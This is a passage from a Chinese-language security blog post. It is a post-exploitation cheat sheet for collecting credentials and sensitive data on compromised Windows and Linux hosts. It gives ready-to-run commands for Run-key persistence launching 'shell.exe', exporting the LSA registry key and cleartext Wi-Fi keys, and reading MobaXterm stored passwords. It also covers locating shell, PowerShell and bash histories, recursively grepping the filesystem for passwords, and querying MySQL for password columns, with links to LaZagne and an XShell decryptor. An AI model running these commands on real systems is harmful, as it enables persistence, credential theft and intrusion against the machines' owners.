<h3 id="3-添加"><a href="#3-添加" class="headerlink" title="3.添加"></a>3.添加</h3><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v &quot;Keyname&quot; /t REG_SZ /d &quot;C:\Users\Administrator\Desktop\shell.exe&quot; /f </span><br></pre></td></tr></table></figure>

<h3 id="4-导出"><a href="#4-导出" class="headerlink" title="4.导出"></a>4.导出</h3><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">reg export HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa AppBkUp.reg</span><br></pre></td></tr></table></figure>

<h2 id="0x02-密码收集"><a href="#0x02-密码收集" class="headerlink" title="0x02 密码收集"></a>0x02 密码收集</h2><h3 id="1-企业域内账号凭据"><a href="#1-企业域内账号凭据" class="headerlink" title="1 企业域内账号凭据"></a>1 企业域内账号凭据</h3><p>1&gt; C:/User/账户名/pip/pip.ini</p>
<p>pip.ini 内网中可能还有http代理信息，代理信息中可能含有账户名及密码。</p>
<p>2&gt;</p>
<h3 id="2-无线密码"><a href="#2-无线密码" class="headerlink" title="2 无线密码"></a>2 无线密码</h3><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#执行下面命令，密码导出在生成的xml文件中</span></span><br><span class="line">netsh WLAN export profile key=<span class="built_in">clear</span> folder=.</span><br></pre></td></tr></table></figure>

<h3 id="3-mobaxterm"><a href="#3-mobaxterm" class="headerlink" title="3 mobaxterm"></a>3 mobaxterm</h3><p>对于安装版的moba，可以通过读取注册表，得到明文密码。</p>
<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">reg query HKEY_CURRENT_USER\Software\Mobatek\MobaXterm</span><br><span class="line">reg query HKEY_CURRENT_USER\Software\Mobatek\MobaXterm\P</span><br></pre></td></tr></table></figure>

<p>更多：<a target="_blank" rel="noopener" href="https://www.cnblogs.com/yang34/p/14236230.html">https://www.cnblogs.com/yang34/p/14236230.html</a></p>
<h3 id="4-XShell"><a href="#4-XShell" class="headerlink" title="4 XShell"></a>4 XShell</h3><p><a target="_blank" rel="noopener" href="https://github.com/dzxs/Xdecrypt">https://github.com/dzxs/Xdecrypt</a></p>
<h3 id="5-浏览器"><a href="#5-浏览器" class="headerlink" title="5 浏览器"></a>5 浏览器</h3><p>提供以下两种方法：</p>
<p><strong>5.1 工具</strong>：</p>
<p><a target="_blank" rel="noopener" href="https://github.com/AlessandroZ/LaZagne/releases">https://github.com/AlessandroZ/LaZagne/releases</a></p>
<p><strong>5.2 可操作桌面时</strong>：</p>
<p>火狐-&gt;打开菜单-&gt;我的密码</p>
<p>Chrome-&gt;设置-&gt;自动填充-&gt;密码</p>
<h3 id="6-数据库密码"><a href="#6-数据库密码" class="headerlink" title="6 数据库密码"></a>6 数据库密码</h3><p>本地web目录下找配置目录中的配置文件</p>
<h3 id="x-to-be-continue"><a href="#x-to-be-continue" class="headerlink" title="[x] to be continue"></a>[x] to be continue</h3><p>filezilla/teamviewer/vnc/系统哈希/navicat</p>
<h2 id="0x03-敏感数据发现"><a href="#0x03-敏感数据发现" class="headerlink" title="0x03 敏感数据发现"></a>0x03 敏感数据发现</h2><h3 id="1-回收站分析"><a href="#1-回收站分析" class="headerlink" title="1 回收站分析"></a>1 回收站分析</h3><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">FOR</span> /f <span class="string">&quot;skip=1 tokens=1,2 delims= &quot;</span> %c <span class="keyword">in</span> (<span class="string">&#x27;wmic useraccount get name,sid&#x27;</span>) <span class="keyword">do</span> <span class="built_in">dir</span> /a /b C:\<span class="variable">$Recycle</span>.Bin\%d\ &gt;%c.txt</span><br><span class="line">PowerShell <span class="literal">-Command</span>  <span class="string">&quot;<span class="variable">$Recycler</span> =(New-Object -ComObject Shell.Application).NameSpace(0xa);foreach(<span class="variable">$file</span> in <span class="variable">$Recycler</span>.items())&#123;echo &quot;</span>---------------------<span class="string">&quot;;<span class="variable">$file</span>.path;<span class="variable">$file</span>.ExtendedProperty(\&quot;</span>&#123;<span class="number">9</span>B174B33<span class="literal">-40FF</span><span class="literal">-11D2</span><span class="literal">-A27E</span><span class="literal">-00C04FC30871</span>&#125; <span class="number">2</span>\<span class="string">&quot;)+&#x27;\&#x27;+<span class="variable">$file</span>.name&#125;&quot;</span></span><br></pre></td></tr></table></figure>

<h3 id="2-常见目录"><a href="#2-常见目录" class="headerlink" title="2 常见目录"></a>2 常见目录</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 桌面</span></span><br><span class="line">C:\Users\%username%\Desktop</span><br><span class="line"><span class="meta">#</span><span class="bash"> 下载目录</span></span><br><span class="line">C:\Users\%username%\Downloads</span><br><span class="line"><span class="meta">#</span><span class="bash"> 微信下载目录</span></span><br><span class="line">C:\Users\%username%\Documents\WeChat Files\微信号\FileStorage\File\归档日期</span><br></pre></td></tr></table></figure>

<h3 id="3-VMware"><a href="#3-VMware" class="headerlink" title="3 VMware"></a>3 VMware</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">一些传送的文件</span></span><br><span class="line">C:\Users\%username%\AppData\Local\Temp\vmware-%username%\VMwareDnD</span><br><span class="line"><span class="meta">#</span><span class="bash">每台vmware的<span class="built_in">log</span>日志都含有启动操作信息。</span></span><br><span class="line">C:\Users\%username%\AppData\Local\Temp\vmware-%username%\</span><br><span class="line"><span class="meta">#</span><span class="bash">vmware内主机的备注信息</span></span><br></pre></td></tr></table></figure>

<h2 id="0x04-历史记录"><a href="#0x04-历史记录" class="headerlink" title="0x04 历史记录"></a>0x04 历史记录</h2><h3 id="1-Git-Bash历史记录"><a href="#1-Git-Bash历史记录" class="headerlink" title="1 Git-Bash历史记录:"></a>1 Git-Bash历史记录:</h3><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">C:\<span class="title">Users</span>\%<span class="title">username</span>%\.<span class="title">bash_history</span></span></span><br><span class="line"><span class="function"><span class="title">C</span>:\<span class="title">Users</span>\%<span class="title">username</span>%\.<span class="title">gitconfig</span></span></span><br></pre></td></tr></table></figure>

<h3 id="2-运行框历史记录"><a href="#2-运行框历史记录" class="headerlink" title="2 运行框历史记录"></a>2 运行框历史记录</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">reg query HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU</span><br><span class="line">reg query HKEY_USERS\&lt;sid&gt;\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU</span><br></pre></td></tr></table></figure>

<h3 id="3-powershell历史记录"><a href="#3-powershell历史记录" class="headerlink" title="3 powershell历史记录"></a>3 powershell历史记录</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Get-Content (Get-PSReadLineOption).HistorySavePath</span><br></pre></td></tr></table></figure>

<h3 id="4-DNS缓存记录"><a href="#4-DNS缓存记录" class="headerlink" title="4 DNS缓存记录"></a>4 DNS缓存记录</h3><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">ipconfig</span> /displaydns</span><br></pre></td></tr></table></figure>



<h1 id="Linux"><a href="#Linux" class="headerlink" title="Linux"></a>Linux</h1><h2 id="0x00-历史记录"><a href="#0x00-历史记录" class="headerlink" title="0x00 历史记录"></a>0x00 历史记录</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> /root/ 及 /home/*/</span></span><br><span class="line">.bash_history</span><br><span class="line">.zsh_history</span><br><span class="line">.mysql_history</span><br></pre></td></tr></table></figure>

<h2 id="0x01-各类凭据"><a href="#0x01-各类凭据" class="headerlink" title="0x01 各类凭据"></a>0x01 各类凭据</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> web服务类</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> -- 定位到服务目录下的配置目录。查看配置文件中的数据库口令</span></span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 登录用户</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 结合 <span class="built_in">history</span>|grep ssh 及~/.ssh/authorized_keys拿到其他设备的登录权限。</span></span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="bash"> redis</span> </span><br><span class="line"><span class="meta">#</span><span class="bash"> -- 定位配置文件中的requirepass</span></span><br><span class="line">find / -name redis.conf</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 密码搜集</span></span><br><span class="line">grep -rn &quot;pass&quot; -a / | grep -v &quot;php\|jsp\|\.js\|\|.java&quot;</span><br><span class="line">find / -name *.properties -o -name *.xml -o -name *.conf -o -name *.json -exec grep -Hn &quot;passw&quot; &#123;&#125; \;</span><br></pre></td></tr></table></figure>



<h1 id="SQL"><a href="#SQL" class="headerlink" title="SQL"></a>SQL</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">/*MySQL数据库内找密码*/</span><br><span class="line">SELECT TABLE_NAME FROM `information_schema`.`COLUMNS` where `COLUMN_NAME` like &#x27;%pass%&#x27;;</span><br><span class="line">SELECT TABLE_NAME FROM `information_schema`.`COLUMNS` where `COLUMN_NAME` like &#x27;%pwd%&#x27;;</span><br></pre></td></tr></table></figure>


      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>




  <nav class="pagination">
    <a class="extend prev" rel="prev" href="/"><i class="fa fa-angle-left" aria-label="Previous page"></i></a><a class="page-number" href="/">1</a><span class="page-number current">2</span><a class="page-number" href="/page/3/">3</a><a class="extend next" rel="next" href="/page/3/"><i class="fa fa-angle-right" aria-label="Next page"></i></a>
  </nav>

</div>
  </main>

  <footer class="footer">
    <div class="footer-inner">


<div class="copyright">
  &copy; 
  <span itemprop="copyrightYear">2021</span>
  <span class="with-love">
    <i class="fa fa-heart"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">aplyc1a</span>
</div>
  <div class="powered-by">Powered by <a href="https://hexo.io/" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/muse/" rel="noopener" target="_blank">NexT.Muse</a>
  </div>

    </div>
  </footer>

  
  <script src="https://cdn.jsdelivr.net/npm/animejs@3.2.1/lib/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/schemes/muse.js"></script><script src="/js/next-boot.js"></script>

  




  





</body>
</html>
